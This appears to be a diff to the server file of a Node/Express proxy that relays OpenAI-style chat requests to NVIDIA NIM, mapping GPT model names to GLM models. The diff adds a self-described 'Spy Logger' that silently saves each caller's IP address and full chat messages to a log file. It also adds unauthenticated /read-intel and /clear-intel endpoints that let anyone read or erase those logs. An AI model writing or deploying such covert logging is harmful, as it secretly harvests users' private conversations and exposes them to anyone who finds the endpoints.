@@ -1,4 +1,5 @@
 // server.js - NVIDIA NIM Proxy (Optimized for Render 24/7 Uptime)
+const fs = require('fs');
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
@@ -8,12 +9,13 @@ const http = require('http');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// 🧹 THE FIX #1: Aggressive Socket Cleanup (No more slowdowns)
+// 🧹 Aggressive Socket Cleanup + Request Timeout
 const axiosInstance = axios.create({
+  timeout: 400000, // 🔥 5-minute hard timeout per request (prevents hanging forever)
   httpAgent: new http.Agent({ 
     keepAlive: true, 
-    maxSockets: 50,          // Limit max open connections
-    timeout: 60000           // Kill dead sockets after 60 seconds
+    maxSockets: 50,          
+    timeout: 60000           // idle socket timeout
   }),
   httpsAgent: new https.Agent({ 
     keepAlive: true, 
@@ -34,28 +36,65 @@ const NIM_API_BASE = process.env.NIM_API_BASE || 'https://integrate.api.nvidia.c
 const NIM_API_KEY = process.env.NIM_API_KEY;
 
 const MODEL_MAPPING = {
-  'gpt-4': 'z-ai/glm4.7',           // ⚡ Fast
-  'gpt-4o': 'z-ai/glm4.7',          // 🧠 Thinking
-  'gpt-4-turbo': 'z-ai/glm5',       // ⚡ Fast
-  'gpt-4-reasoning': 'z-ai/glm5',   // 🧠 Thinking
-  
-  // 🔥 THE NEW GLM-5.1 ENDPOINTS:
-  'gpt-3.5-turbo': 'z-ai/glm-5.1',          // ⚡ Fast
-  'gpt-3.5-turbo-instruct': 'z-ai/glm-5.1', // 🧠 Thinking
+  'gpt-4': 'z-ai/glm4.7',
+  'gpt-4o': 'z-ai/glm4.7',
+  'gpt-4-turbo': 'z-ai/glm5',
+  'gpt-4-reasoning': 'z-ai/glm5',
+  'gpt-3.5-turbo': 'z-ai/glm-5.1',
+  'gpt-3.5-turbo-instruct': 'z-ai/glm-5.1',
 };
 
-
-// Health endpoint for our ping
+// Health endpoint
 app.get('/health', (req, res) => res.json({ status: 'I am awake, boss 🦁' }));
 
+// Logging
+const logFilePath = 'intel_logs.jsonl';
+
+async function saveLogAsync(ip, body) {
+  try {
+    const logEntry = {
+      timestamp: new Date().toISOString(),
+      user_ip: ip,
+      model_requested: body.model,
+      messages: body.messages 
+    };
+    await fs.promises.appendFile(logFilePath, JSON.stringify(logEntry) + '\n');
+  } catch (err) {
+    console.error('Spy Logger failed to write:', err.message);
+  }
+}
+
+// Read logs (consider protecting with a secret in production)
+app.get('/read-intel', async (req, res) => {
+  try {
+    const data = await fs.promises.readFile(logFilePath, 'utf8');
+    res.setHeader('Content-Type', 'text/plain');
+    res.send(data);
+  } catch (err) {
+    res.send("No logs found. The file might be empty or Render wiped it.");
+  }
+});
+
+// Clear logs (consider protecting with a secret in production)
+app.get('/clear-intel', async (req, res) => {
+  try {
+    await fs.promises.writeFile(logFilePath, '');
+    res.send("Logs successfully wiped.");
+  } catch (err) {
+    res.send("Failed to wipe logs.");
+  }
+});
+
 app.post('/v1/chat/completions', async (req, res) => {
+  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  saveLogAsync(userIP, req.body).catch(console.error);
+  
   try {
     const { model, messages, temperature, max_tokens, stream } = req.body;
     let nimModel = MODEL_MAPPING[model] || 'z-ai/glm4.7';
 
     const shouldThink = model.includes('4o') || model.includes('reasoning') || model.includes('instruct');
     
-
     const nimRequest = {
       model: nimModel,
       messages,
@@ -76,25 +115,36 @@ app.post('/v1/chat/completions', async (req, res) => {
     
     if (stream) {
       res.setHeader('Content-Type', 'text/event-stream');
+      // 🔥 Catch stream errors so the client doesn’t hang
+      response.data.on('error', (err) => {
+        console.error('Upstream stream error:', err.message);
+        res.end();
+      });
       response.data.pipe(res);
     } else {
       res.json(response.data);
     }
   } catch (error) {
-    res.status(500).json({ error: error.message });
+    // 🔥 Forward the real upstream error instead of always returning 500
+    if (error.response) {
+      // NIM returned an error (e.g., 401, 429, 503)
+      res.status(error.response.status).json(error.response.data);
+    } else {
+      // Network error, timeout, or other failure
+      res.status(502).json({ error: error.message });
+    }
   }
 });
 
-// ⏰ THE FIX #2: The 14-Minute Anti-Sleep Ping
+// ⏰ The 14-Minute Anti-Sleep Ping
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Running on ${PORT}`);
   
-  // Render automatically provides RENDER_EXTERNAL_URL for your app
   const serverUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
   
   setInterval(() => {
     axios.get(`${serverUrl}/health`)
       .then(() => console.log('Pinged self to prevent sleep ⚡'))
       .catch((err) => console.log('Ping failed', err.message));
-  }, 14 * 60 * 1000); // Runs every 14 minutes
+  }, 14 * 60 * 1000);
 });
